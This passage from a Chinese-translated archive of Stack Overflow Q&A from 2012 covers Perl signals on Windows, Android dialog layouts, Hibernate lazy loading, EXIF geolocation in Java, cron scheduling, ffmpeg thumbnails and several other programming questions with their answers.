$pid = xxxx;  #this is the manually entered pid for I process
print "will attempt to kill process: $pid\n";
kill INT, $pid; 
```

我运行第一个 perl 脚本并按 Ctrl-C，处理程序按预期工作，但使用第二个文件我无法获得相同的结果。我也尝试过其他信号，如 ALRM、HUP、TERM、FPE，但没有成功。我要做的就是在信号处理程序中执行代码。

[我为 win32](http://www.cs.cf.ac.uk/Dave/PERL/node116.html)找到了一个叫做 INT2 信号的东西。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T08:42:03.983

Windows 确实允许您仅在同一线程中使用信号。所以发信号给不同的进程是行不通的。

除了信号，您还可以使用其他进程间通信方法，如套接字、管道或文件。

从[perlwin32](http://perldoc.perl.org/perlwin32.html#Miscellaneous-Things)：

> 信号处理可能不像在 Unix 平台上那样表现（它也不完全“表现”：）。例如，从信号处理程序调用 die() 或 exit() 将导致异常，因为 Windows 上的大多数 signal() 实现都严重受损。因此，信号可能仅适用于简单的事情，例如在处理程序中设置标志变量。在这个端口下使用信号目前应该被认为是不支持的。

# javascript - 检测 IE 中的安全警报

> ID：11427606
> 
> 赞同：-1
> 
> 时间：2012-07-11T07:24:40.590
> 
> 标签：javascript, internet-explorer

例如，当使用 HTTPS 访问网站时，IE 有时会弹出安全警告。这些不是 JavaScript 弹出窗口。

如何使用 JavaScript 检测这些弹出窗口？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:36:22.187

这些警告是有原因的。至于*如何*通知用户安全页面包含非安全资源，微软使用“警告框”的决定可能值得怀疑，但试图干预警告本身并不是可行的方法。相反，请查看您的网站，并确保您的用户的浏览器首先正确（安全地）获取内容和资源，正如他们应该做的那样。

# c++ - iOS 应用程序在相同的内存地址获得 EXC_BAD_ACCESS 但原因不同

> ID：11427608
> 
> 赞同：0
> 
> 时间：2012-07-11T07:24:49.323
> 
> 标签：c++, objective-c, ios, xcode, ios5

我正在构建一个 iOS 应用程序。它使用与 cocos2d 游戏一起运行的 C++ 库（人群模拟库，它确定许多代理的位置）。

在我添加了更多动画和额外的铃声和口哨声后，应用程序在大约 6-30 秒后崩溃，出现如下错误： tiny_malloc_from_free_list tiny_free_list_remove_ptr

问题是，它总是发生在同一个内存地址 0x1000。但是我可以在两个不同的设备上准确地复制错误，所以不是内存本身不好。

我并不期待一个完整的答案，但是一些指向我应该开始寻找的指针会非常好:) 谢谢！

编辑：我完全删除了 c++ lib，但错误仍然存​​在。一旦我靠近了，我会更新。

编辑：问题出在 Cocos2d v. 2 显示统计数据中添加和删除指针。感谢您的所有帮助！纹理枚举值之一是 1<<12 并用作指针...我停止使用显示统计信息。：） 谢谢你们！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:34:01.187

有了这样的地址，我会怀疑某处的整数到指针的转换。那是什么，4096？我可能会在库中搜索具有该值的常量（可能通过位移 1<<12 实现），并查看是否可以以奇怪的方式找到使用该常量的代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:34:21.190

假设您的回溯不会立即显示问题...

听起来这可能是对 nil“对象”的尊重，其中代码试图引用 *(p + 0x1000)。请注意，0x1000 可能是 VM 页面大小。

在这种情况下，我会打开僵尸并保护 malloc，看看我是否能在问题发生时抓住它。

# android - 将活动显示为对话框的问题

> ID：11427614
> 
> 赞同：2
> 
> 时间：2012-07-11T07:25:08.943
> 
> 标签：android

我有一个活动课。对于这个 Activity 类，我有一个 XML 布局。我想将此活动类显示为对话框，因此要在清单中执行以下更改。

```
 <activity
    android:name=".AlarmDialogActivity"
    android:theme="@android:style/Theme.Dialog">            
 </activity> 
```

当我运行我的应用程序时，活动类显示为对话框，但宽度被压缩，它不会占据设备的全屏。为什么会这样？谁能帮我解决这个问题？

**xml布局代码**

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/layout_alarm_dialog"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:background="#E0D5B1"
    android:gravity="center_vertical|center_horizontal"
    android:orientation="vertical" >

        <TextView
            android:id="@+id/dialog_title_text"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginTop="10dp"
            android:text="@string/dialog_title_text"
            android:textColor="#e89192"
            android:textSize="18dp" >
        </TextView>

        <ListView
            android:id="@+id/alarm_list_view"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:layout_marginBottom="15dp"
            android:layout_marginTop="10dp"
            android:cacheColorHint="#00000000"
            android:divider="@null"
            android:dividerHeight="0dp"
            android:listSelector="#00000000" >
        </ListView>

    <LinearLayout
        android:id="@+id/bottom_control_bar"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_marginBottom="10dp"
        android:layout_marginLeft="10dp"
        android:layout_marginRight="10dp"
        android:layout_marginTop="10dp"
        android:gravity="center_horizontal|center_vertical" >

        <Button
            android:id="@+id/button_dismiss"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="@string/button_dismiss_text"
            android:textColor="#121212"
            android:textSize="18dp" >
        </Button>
    </LinearLayout>

</LinearLayout> 
```

**对话框截图**

![在此处输入图像描述](../Images/ea16e7bab3832c038ac939ff16324c58.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T08:11:41.530

通过以下方式更改您的 xml 布局文件：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout 
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent">

    <Button 
        android:id="@+id/btn"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="xxxxxxxx"
        android:layout_alignParentBottom="true"
        android:layout_centerHorizontal="true"
        android:textColor="#121212"
            android:textSize="18dp"/>

    <TextView 
        android:id="@+id/txt"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:text="xxxxxxxxxxxx"
        android:textColor="#e89192"
        android:textSize="18dp"
        android:gravity="center"/>

    <ListView 
        android:id="@+id/list"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_below="@+id/txt"
        android:layout_above="@+id/btn"/>

</RelativeLayout> 
```

添加您想要添加到布局的任何样式。

在活动的 setcontentview 之前添加以下行：

```
requestWindowFeature(Window.FEATURE_NO_TITLE); 
```

这在您的活动下的清单文件中：

```
 android:theme="@android:style/Theme.Dialog" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:28:44.503

试试这个：

```
<TextView
    android:id="@+id/dialog_title_text"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:layout_marginTop="10dp"
    android:text="@string/dialog_title_text"
    android:textColor="#e89192"
    android:textSize="18dp" >
</TextView> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:39:16.497

在活动类文件中试试这个：

```
WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
lp.copyFrom(dialogPost.getWindow().getAttributes());                      
lp.gravity = Gravity.CENTER;
lp.width = WindowManager.LayoutParams.FILL_PARENT;
dialogPost.getWindow().setAttributes(lp);  
dialogPost.show(); 
```

`dialogPost`一个在哪里`DialogBox`。您可以使用 更改您的视图`dialogPost`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T08:03:28.077

`android:layout_width="fill_parent`在您的 TextView 中尝试。它对我有用。

# python - BeautifulSoup 找不到任何标签

> ID：11427619
> 
> 赞同：2
> 
> 时间：2012-07-11T07:25:25.297
> 
> 标签：python, beautifulsoup

我正在尝试在这里抓取网站：ftp: [//ftp.sec.gov/edgar/daily-index/](ftp://ftp.sec.gov/edgar/daily-index/)。使用如下所示的代码：

```
from bs4 import BeautifulSoup  
import urllib.request
html = urllib.request.urlopen("ftp://ftp.sec.gov/edgar/daily-index/")
soup = BeautifulSoup(line, "lxml")
soup.a # or soup.find_all('a') neither of them works
#return None. 
```

请帮忙，我对此感到非常沮丧。我怀疑是标签导致了问题。该站点的 Html 看起来格式正确（匹配的标签），所以我不知道为什么 BeautifulSoup 没有找到任何东西。谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-11T07:35:44.360

`ftp://ftp.sec.gov/edgar/daily-index/`URL 指向 FTP 目录，而不是 HTML 页面。

您的*浏览器*可以根据 FTP 目录内容生成 HTML，但是当您使用`urllib.request`.

您可能想直接使用该[`ftplib`模块](http://docs.python.org/py3k/library/ftplib.html)来读取目录列表，或检查 first 的返回值`urlopen(...).read()`。

# java - java中jpeg的地理定位

> ID：11427625
> 
> 赞同：0
> 
> 时间：2012-07-11T07:25:39.090
> 
> 标签：java, geolocation, struts

我的朋友正在使用 Struts (Java)，我们正在尝试查找 JPEG 图片的 GeoLocation。

我不知道在哪里阅读或如何为它实现 java 代码。

我想以 jpeg 格式获取图像并将其显示在网站上的谷歌地图上。

你如何将这些信息从 Exif 标签传递到谷歌地图，这样我就可以在地图上看到位置

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:32:20.283

地理位置部分与 Struts 无关。Struts 只涉及数据的呈现。

图像的地理位置*有时*存储在 JPEG 文件的元数据中。您可以使用这样的库[从](http://www.drewnoakes.com/code/exif/)JPEG 图像中提取元数据。

请注意，许多相机不存储地理位置数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-10-25T03:33:29.923

您的问题有 2 个部分

1.  从 Jpeg 图像中提取 gps 信息
2.  如何将提取的信息提供给谷歌地图。

这里详细讨论第一部分

现在使用[apache commons-imaging 库大大简化和简化了读取 Image Meta](https://github.com/apache/commons-imaging)

```
/**
 * Reference : https://github.com/apache/commons-imaging/blob/master/src/test/java/org/apache/commons/imaging/examples/MetadataExample.java
 */
public static void readImageMeta(final File imgFile) throws ImageReadException, IOException {
    /** get all metadata stored in EXIF format (ie. from JPEG or TIFF). **/
    final ImageMetadata metadata = Imaging.getMetadata(imgFile);
    System.out.println(metadata);
    System.out.println("--------------------------------------------------------------------------------");

    /** Get specific meta data information by drilling down the meta **/
    if (metadata instanceof JpegImageMetadata) {
        JpegImageMetadata jpegMetadata = (JpegImageMetadata) metadata;
        printTagValue(jpegMetadata, GpsTagConstants.GPS_TAG_GPS_LATITUDE_REF);
        printTagValue(jpegMetadata, GpsTagConstants.GPS_TAG_GPS_LATITUDE);
        printTagValue(jpegMetadata, GpsTagConstants.GPS_TAG_GPS_LONGITUDE_REF);
        printTagValue(jpegMetadata, GpsTagConstants.GPS_TAG_GPS_LONGITUDE);

        // simple interface to GPS data
        final TiffImageMetadata exifMetadata = jpegMetadata.getExif();
        if (null != exifMetadata) {
            final TiffImageMetadata.GPSInfo gpsInfo = exifMetadata.getGPS();
            if (null != gpsInfo) {
                final String gpsDescription = gpsInfo.toString();
                final double longitude = gpsInfo.getLongitudeAsDegreesEast();
                final double latitude = gpsInfo.getLatitudeAsDegreesNorth();

                System.out.println("    " + "GPS Description: " + gpsDescription);
                System.out.println("    " + "GPS Longitude (Degrees East): " + longitude);
                System.out.println("    " + "GPS Latitude (Degrees North): " + latitude);
            }
        }

        // more specific example of how to manually access GPS values
        final TiffField gpsLatitudeRefField = jpegMetadata.findEXIFValueWithExactMatch(GpsTagConstants.GPS_TAG_GPS_LATITUDE_REF);
        final TiffField gpsLatitudeField = jpegMetadata.findEXIFValueWithExactMatch(GpsTagConstants.GPS_TAG_GPS_LATITUDE);
        final TiffField gpsLongitudeRefField = jpegMetadata.findEXIFValueWithExactMatch(GpsTagConstants.GPS_TAG_GPS_LONGITUDE_REF);
        final TiffField gpsLongitudeField = jpegMetadata.findEXIFValueWithExactMatch(GpsTagConstants.GPS_TAG_GPS_LONGITUDE);
        if (gpsLatitudeRefField != null && gpsLatitudeField != null && gpsLongitudeRefField != null && gpsLongitudeField != null) {
            // all of these values are strings.
            final String gpsLatitudeRef = (String) gpsLatitudeRefField.getValue();
            final RationalNumber[] gpsLatitude = (RationalNumber[]) (gpsLatitudeField.getValue());
            final String gpsLongitudeRef = (String) gpsLongitudeRefField.getValue();
            final RationalNumber[] gpsLongitude = (RationalNumber[]) gpsLongitudeField.getValue();

            final RationalNumber gpsLatitudeDegrees = gpsLatitude[0];
            final RationalNumber gpsLatitudeMinutes = gpsLatitude[1];
            final RationalNumber gpsLatitudeSeconds = gpsLatitude[2];

            final RationalNumber gpsLongitudeDegrees = gpsLongitude[0];
            final RationalNumber gpsLongitudeMinutes = gpsLongitude[1];
            final RationalNumber gpsLongitudeSeconds = gpsLongitude[2];

            // This will format the gps info like so:
            //
            // gpsLatitude: 8 degrees, 40 minutes, 42.2 seconds S
            // gpsLongitude: 115 degrees, 26 minutes, 21.8 seconds E

            System.out.println("    " + "GPS Latitude: " + gpsLatitudeDegrees.toDisplayString() + " degrees, " + gpsLatitudeMinutes.toDisplayString() + " minutes, " + gpsLatitudeSeconds.toDisplayString() + " seconds " + gpsLatitudeRef);
            System.out.println("    " + "GPS Longitude: " + gpsLongitudeDegrees.toDisplayString() + " degrees, " + gpsLongitudeMinutes.toDisplayString() + " minutes, " + gpsLongitudeSeconds.toDisplayString() + " seconds " + gpsLongitudeRef);
        }
    }
}

private static void printTagValue(final JpegImageMetadata jpegMetadata, TagInfo tagInfo) {
    final TiffField field = jpegMetadata.findEXIFValueWithExactMatch(tagInfo);
    if (field == null) {
        System.out.println(tagInfo.name + ": " + "Not Found.");
    } else {
        System.out.println(tagInfo.name + ": " + field.getValueDescription());
    }
}

public static void main(String[] args) throws IOException, ImageReadException {
    File sourceFile = new File("/Users/vivek/myimage.jpg");
    readImageMeta(sourceFile);
} 
```

上面的代码将给出这个输出

```
Exif metadata:
    Root: 
        ImageWidth: 3024
        ImageLength: 4032
        BitsPerSample: 8, 8, 8
        PhotometricInterpretation: 2
        Make: 'Apple'
        Model: 'iPhone 6s'
        Orientation: 1
        SamplesPerPixel: 3
        XResolution: 72
        YResolution: 72
        ResolutionUnit: 2
        Software: 'Adobe Photoshop CC 2015 (Macintosh)'
        DateTime: '2016:05:17 16:55:55'
        YCbCrPositioning: 1
        ExifOffset: 300
        GPSInfo: 868

    Exif: 
        ExposureTime: 1/100 (0.01)
        FNumber: 11/5 (2.2)
        ExposureProgram: 2
        PhotographicSensitivity: 40
        ExifVersion: 48, 50, 50, 49
        DateTimeOriginal: '2016:05:08 18:03:57'
        DateTimeDigitized: '2016:05:08 18:03:57'
        ComponentsConfiguration: 1, 2, 3, 0
        ShutterSpeedValue: 35113/5284 (6.645)
        ApertureValue: 7983/3509 (2.275)
        BrightnessValue: 13026/2395 (5.439)
        ExposureCompensation: 0
        MeteringMode: 5
        Flash: 16
        FocalLength: 83/20 (4.15)
        SubjectArea: 618, 1555, 310, 311
        SubSecTimeOriginal: '523'
        SubSecTimeDigitized: '523'
        FlashpixVersion: 48, 49, 48, 48
        ColorSpace: 1
        ExifImageWidth: 3024
        ExifImageLength: 4032
        SensingMethod: 2
        SceneType: 1
        CustomRendered: 4
        ExposureMode: 0
        WhiteBalance: 0
        FocalLengthIn35mmFormat: 29
        SceneCaptureType: 0
        LensSpecification: 83/20 (4.15), 83/20 (4.15), 11/5 (2.2), 11/5 (2.2)
        LensMake: 'Apple'
        LensModel: 'iPhone 6s back camera 4.15mm f/2.2'

    Gps: 
        GPSLatitudeRef: 'N'
        GPSLatitude: 13, 21, 3305/100 (33.05)
        GPSLongitudeRef: 'E'
        GPSLongitude: 75, 33, 2034/100 (20.34)
        GPSAltitudeRef: 0
        GPSAltitude: 83651/95 (880.537)
        GPSTimeStamp: 12, 33, 57
        GPSSpeedRef: 'K'
        GPSSpeed: 21/100 (0.21)
        GPSImgDirectionRef: 'T'
        GPSImgDirection: 1654/31 (53.355)
        GPSDestBearingRef: 'T'
        GPSDestBearing: 1654/31 (53.355)
        GPSDateStamp: '2016:05:08'
        Unknown Tag (0x1f): 5

    Sub:  (jpegImageData)
        Compression: 6
        XResolution: 72
        YResolution: 72
        ResolutionUnit: 2
        JpgFromRawStart: 1274
        JpgFromRawLength: 8211

Photoshop (IPTC) metadata:
        Date Created: 20160508
        Time Created: 180357+0000
--------------------------------------------------------------------------------
GPSLatitudeRef: 'N'
GPSLatitude: 13, 21, 3305/100 (33.05)
GPSLongitudeRef: 'E'
GPSLongitude: 75, 33, 2034/100 (20.34)
    GPS Description: [GPS. Latitude: 13 degrees, 21 minutes, 33.05 seconds N, Longitude: 75 degrees, 33 minutes, 20.34 seconds E]
    GPS Longitude (Degrees East): 75.55565
    GPS Latitude (Degrees North): 13.359180555555556
    GPS Latitude: 13 degrees, 21 minutes, 33.05 seconds N
    GPS Longitude: 75 degrees, 33 minutes, 20.34 seconds E 
```

[Fore More 请参阅此处](https://commons.apache.org/proper/commons-imaging/index.html)的库文档
Maven Repo Link[此处](https://mvnrepository.com/artifact/org.apache.commons/commons-imaging)。
注意：此时它是 alpha 版本，但您可以信任 apache：D。

干杯!

# php - cron中的命令每隔一定分钟运行一次php

> ID：11427636
> 
> 赞同：0
> 
> 时间：2012-07-11T07:26:15.800
> 
> 标签：php, cron

这可能是重复。
我想每隔几分钟运行一次 index.php。我的服务器有选项运行 cron 命令/ cron 作业。有人请告诉我我应该用什么来安排。
提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:27:56.690

首先，*为什么*？

其次，`crontab -e`将允许您编辑您的 crontab。然后就很简单了

```
? * * * * php /path/to/index.php 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:30:17.103

你可以使用这个命令

```
Minutes Hours  Day  Month WeekDay
45      *      *    *     *        php /path/to/index.php * 
```

这是[一篇](http://net.tutsplus.com/tutorials/php/managing-cron-jobs-with-php-2/)关于 php cron manager的文章

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:28:18.330

首先，这是 cron 的工作原理：

[http://en.wikipedia.org/wiki/Cron](http://en.wikipedia.org/wiki/Cron)

然后，该命令应如下所示：

`* * * * * cd /directory/of/the/script/ && php scriptname.php >> /directory/of/the/logfile.log`

# video - ffmpeg vs mediainfo 用于获取缩略图和元数据

> ID：11427637
> 
> 赞同：4
> 
> 时间：2012-07-11T07:26:18.760
> 
> 标签：video, ffmpeg, metadata, mediainfo

我需要从视频文件中提取元数据信息以及该文件的缩略图。为此，我尝试了 ffmpeg，元数据（例如持续时间、分辨率、编解码器、creation_time 等）可以在标准输出上看到。如果我需要使用这些，我应该解析标准输出并提取我需要的元数据。

我还阅读了有关提供元数据的 MediaInfo 实用程序的信息。我不确定它是否可以提供缩略图。我还知道 MediaInfo 在后台不使用 ffmpeg。

我想知道是否有人同时具备 ffmpeg 和 MediaInfo 的工作知识，以及关于我上面提到的要求，是否有人可以建议两者中的哪一个更适合。

两者的内存占用比较也很好。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-13T22:59:25.233

您应该按照其他答案中的说明直接使用底层库。

但是，为了完整起见，如果您坚持使用单独的 shell 进程，**请不要解析 FFmpeg 的输出**。相反，请**使用[FFprobe](http://ffmpeg.org/ffprobe.html)**，这是一种鲜为人知的工具，专门用于补充 FFmpeg 并简化元数据提取。

此外，可以使用 FFmpeg 或多或少地像这样生成缩略图：

```
ffmpeg [-ss 10] -i input.avi -vframes 1 -s 320x240 thumbnail.png 
```

调整大小以适应口味，并使用可选`-ss`参数从视频开头以外的某个点抓取图像。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-11T08:08:48.140

正确答案既不是 ffmpeg 也不是 mediainfo。好吧，无论如何都不是完整的可执行文件。

ffmpeg 由一系列库组成，包括`libavformat`允许您使用多媒体容器格式的库。Martin Böhme 的[使用 libavformat 和 libavcodec应该会给你一个很好的介绍。](http://www.inb.uni-luebeck.de/~boehme/using_libavcodec.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-11T10:19:56.693

据我所知，MediaInfo 是开源的（[见这里](http://mediainfo.sourceforge.net/en)），它的库可以在 C++ 或 C# 的 Windows 环境（它是一个 dll）中使用。无需解析输出。它有开发人员的文档和一些示例。

我不认为它可以提取缩略图。

# java - LazyInitializationException 与 Hibernate 4.1、Spring 3.1 和 JSF 1.2 (Myfaces)

> ID：11427644
> 
> 赞同：1
> 
> 时间：2012-07-11T07:26:39.497
> 
> 标签：java, spring, hibernate, mapping, lazy-initialization

我有一个使用 Hibernate 4.1 和 Spring 3.1 和 JSF 1.2 (myFaces) 的 webapp。

每次尝试访问我的一个页面时，我都会遇到此“LazyInitializationException”

```
Caused by: org.hibernate.LazyInitializationException: could not initialize proxy - no Session
at £org.hibernate.proxy.AbstractLazyInitializer.initialize(AbstractLazyInitializer.java:149)
at org.hibernate.proxy.AbstractLazyInitializer.getImplementation(AbstractLazyInitializer.java:195)
at org.hibernate.proxy.pojo.javassist.JavassistLazyInitializer.invoke(JavassistLazyInitializer.java:185)
at foo.data.bo.implementations.EOServiceType_$$_javassist_10.getTechKey(EOServiceType_$$_javassist_10.java)
at foo.converter.EOServiceTypeConverter.getAsString(EOServiceTypeConverter.java:36)
at org.apache.myfaces.shared_tomahawk.renderkit.RendererUtils.getConvertedStringValue(RendererUtils.java:648)
at org.apache.myfaces.shared_tomahawk.renderkit.html.HtmlRendererUtils.getSubmittedOrSelectedValuesAsSet(HtmlRendererUtils.java:362)
at org.apache.myfaces.shared_tomahawk.renderkit.html.HtmlRendererUtils.internalRenderSelect(HtmlRendererUtils.java:337)
at org.apache.myfaces.shared_tomahawk.renderkit.html.HtmlRendererUtils.renderMenu(HtmlRendererUtils.java:288)
at org.apache.myfaces.shared_tomahawk.renderkit.html.HtmlMenuRendererBase.encodeEnd(HtmlMenuRendererBase.java:57)
at org.apache.myfaces.renderkit.html.ext.HtmlMenuRenderer.encodeEnd(HtmlMenuRenderer.java:70)
at javax.faces.component.UIComponentBase.encodeEnd(UIComponentBase.java:649)
... 50 more 
```

我想我误解了一些东西，因为我不知道如何为我的班级提供“会议”。

有关信息，这是我的一些配置文件：

弹簧配置.xml：

```
<context:annotation-config />
<context:component-scan base-package="foo" />

<bean id="sessionFactory" class="org.springframework.orm.hibernate4.LocalSessionFactoryBean">
    <property name="dataSource" ref="dataSource" />
    <property name="configLocation">
        <value>classpath:hibernate.cfg.xml</value>
    </property>
    <property name="namingStrategy">
        <ref bean="oracleNamingStrategy" />
    </property>
</bean>

<tx:annotation-driven transaction-manager="transactionManager" />

<bean id="transactionManager" class="org.springframework.orm.hibernate4.HibernateTransactionManager">
     <property name="sessionFactory" ref="sessionFactory"/>
</bean>

<alias name="jndiDataSource" alias="dataSource" />

<bean name="oracleNamingStrategy"
      class="org.hibernate.cfg.ImprovedNamingStrategy">
</bean>

<bean name="jndiDataSource" class="org.springframework.jndi.JndiObjectFactoryBean">
    <property name="jndiName">
        <value>java:comp/env/jdbc/fooDS</value>
    </property>
</bean> 
```

我的 java 类 EOServiceType

```
@Entity
@Table(name="EOSERVICETYPE")
public class EOServiceType implements IEOServiceType {

@Id
@Column(name="EOSERVICETYPE_ID")
private long techKey; 

@Column(name="H_PROPERTY")
private String property;

@Column(name="H_DESCRIPTION")
private String description;

//... + all getters and setters
} 
```

我的 Hibernate EOServiceTypeDaoHibernateImpl 的 DAO 实现

```
@Repository("eOServiceTypeDao")
public class EOServiceTypeDaoHibernateImpl implements IEOServiceTypeDao {

@Autowired
private SessionFactory sessionFactory;

    public void save(IEOServiceType serviceType) {
    sessionFactory.getCurrentSession().save(serviceType);
}

public void update(IEOServiceType serviceType) {
    sessionFactory.getCurrentSession().update(serviceType);
}

    //... and some other CRUD operations...
} 
```

我的 Hibernate EOWebStaffServicesImpl 的 POJO 服务实现

```
@Service
public class EOWebStaffServicesImpl implements IEOWebStaffServices {

@Autowired
private SessionFactory sessionFactory;

//...

@Autowired
private IEOServiceTypeDao eoServiceTypeDao;

    public void saveOrUpdateEOServiceType(IEOServiceType eoServiceType) {
    try {
        eoServiceTypeDao.saveOrUpdate(eoServiceType);
    } catch (DataIntegrityViolationException e) {
        DuplicateKeyException exception= new DuplicateKeyException("Duplicate business key for " + eoServiceType,e);
        throw exception;
    }
}
    public void deleteEOServiceType(IEOServiceType eoServiceType) {
    eoServiceTypeDao.delete(eoServiceType);
} 
```

我的休眠配置文件：

```
<hibernate-configuration>
<session-factory>
    <property name="hibernate.mapping.precedence">hbm, class</property>    
<property name="show_sql">false</property>
<property name="format_sql">true</property>
<property name="dialect">org.hibernate.dialect.Oracle10gDialect</property>
<property name="jdbc.batch_size">20</property>

    <mapping class="foo.data.bo.implementations.EOServiceType"/>
    <!-- ... and other mappings -->
</session-factory>
</hibernate-configuration> 
```

有没有人有提示可以帮助我？我阅读了一些文章和帖子，但并没有真正找到解决问题的方法。

此致，

卡姆兰

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:44:46.953

几周前我遇到了同样的问题。我显然忘记*注释*与**Hibernate**交互的方法。

我向你推荐

```
@Transactional 
```

注解。它应该可以解决您的问题。

否则这里是相关的**Hibernate**文档： [Sessions and Transactions](https://community.jboss.org/wiki/SessionsAndTransactions)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:39:44.213

我认为这是因为您没有在 DAO 类中使用事务。Hibernate 不能在事务之外与 Spring 一起工作。您可以使用 Spring 定义声明性事务（使用 @Transactional 注释注释必要的类）。这是[有关 Transactions 的 Spring 参考文档](http://static.springsource.org/spring/docs/3.0.x/reference/transaction.html)的链接。

此外，您应该在使用之前将 SessionFactory 注入到您的 bean 中：

```
@autowired
private SessionFactory sessionFactory; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T09:05:55.717

你打算`SessionFactory`在你的服务类中存档什么？

无论如何，我认为问题在于您正在尝试访问具有惰性属性的分离对象。（当您看到该异常时通常就是这种情况）

这就是您 POJO 的所有代码吗？

# javascript - 使用 JavaScript 获取 widgetVar 或选中/取消选中所有其他 PrimeFaces 复选框

> ID：11427647
> 
> 赞同：4
> 
> 时间：2012-07-11T07:26:53.490
> 
> 标签：javascript, jquery, jsf, primefaces

我在一个页面上有几个 PrimeFaces 复选框。如果单击主复选框，则应选中/取消选中所有其他复选框。使用纯 HTML 复选框，这将是一个简单的问题。但是因为 PrimeFaces 不显示复选框本身，而是显示图像，所以下面的 JavaScript 代码不起作用：

```
<script type="text/javascript">
$(document).ready(function() {
    var masterCheckbox = $(".ui-chkbox.master :checkbox");
    var slaveCheckboxes = $(".ui-chkbox:not(.master) :checkbox");

    updateMaster();
    masterCheckbox.change(updateSlaves);
    slaveCheckboxes.change(updateMaster);

    function updateMaster() {
        var allSlavesChecked = true;
        slaveCheckboxes.each(function() {
            if (!$(this).is(':checked')) {
                allSlavesChecked = false;
            }
        });
        masterCheckbox.attr("checked", allSlavesChecked);
    }

    function updateSlaves() {
        var masterChecked = masterCheckbox.is(":checked");
        slaveCheckboxes.each(function() {
            $(this).attr("checked", masterChecked);
        });
    }
});
</script> 
```

我知道我可以使用 PrimeFaces widgetVar 来切换复选框，但我不知道如何使用 JavaScript 获取 PrimeFaces 小部件对象。我认为 RichFaces 将 component 属性添加到 DOM 元素，但 PrimeFaces 没有。有人知道这个问题的解决方案吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-11T21:09:41.470

你是对的——如果你像这样创建你的组件：

```
<p:selectBooleanCheckbox value="val" widgetVar="myCheckbox"/> 
```

您可以通过引用它的 widgetVar 来访问该复选框，在这种情况下调用 PrimeFaces 客户端 API 将其标记为已选中：

```
<script>
   myCheckbox.check();
</script> 
```

然后，您可以将主复选框的 onchange 事件绑定到一个 javascript 方法，该方法根据主复选框的状态检查或取消选中所有“从属”复选框的状态（建议您将状态存储在隐藏字段中）。

请注意，处理“更改”ajax 事件并在服务器端实现检查/取消检查逻辑可能会让您的生活更轻松。只需确保在 p:ajax 组件的更新属性中提供所有从复选框的所有 ID：

```
<p:selectBooleanCheckbox id="masterChkBox" ...>
  <p:ajax event="change" listener="#{yourBean.handleMasterChange}" update="...all slavecheckbox ids..."/>
</p:selectBooleanCheckbox> 
```

# excel - 将数据从 Excel 导入 Access

> ID：11427649
> 
> 赞同：0
> 
> 时间：2012-07-11T07:27:04.250
> 
> 标签：excel, ms-access, vba

`Sheet 1`我在 Excel 中有一些列。我需要通过匹配 Access 和 Excel 中的列标题将数据导入 Access。同样，我想将多个 Excel 文件导入 Access 中，根据 Access 中的列（字段）将数据附加到现有表中。

这甚至可能吗？如果是这样，我将如何去做？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-11T10:06:04.303

最简单的方法是使用 DoCmd.TransferSpreadsheet 链接 Excel 工作表或范围：

```
DoCmd.TransferSpreadsheet acLink, acSpreadsheetTypeExcel8, _
"Atable", "z:\docs\test.xls", True, "A1:A15" 
```

然后，您就有了一个可以使用通常的 MS Access SQL 操作的表。

您还可以参考 Excel 工作表 - `[Sheet1$]`- 或查询中的范围：

```
INSERT INTO Table1 ( ADate ) 
SELECT SomeDate FROM [Excel 8.0;HDR=YES;DATABASE=Z:\Docs\Test.xls].[Sheet1$a1:a4] 
```

或者使用命名范围，注意 Excel 8.0 也适用于 2007 类型的文件。

```
INSERT INTO Table1 
SELECT * FROM [Excel 8.0;HDR=YES;DATABASE=Z:\Docs\Test.xlsm].[XLTable] 
```

其中 XLTable 是一个命名范围。

# html - Child Div 中断 Parent Div 重复背景

> ID：11427651
> 
> 赞同：1
> 
> 时间：2012-07-11T07:27:13.393
> 
> 标签：html, css

我目前有一个带有重复 y 背景的 div 元素，而一个子 div 会中断当前背景。

我怎样才能阻止这种情况发生？

```
 <div id="content">
     <div id="container-top"></div>
     <div id="container-body">
        <div id="container-right">
           <h1>LOGIN</h1>
           <br />
           <h1>CLICK HERE</h1>
        </div>
        <div id="container-left">
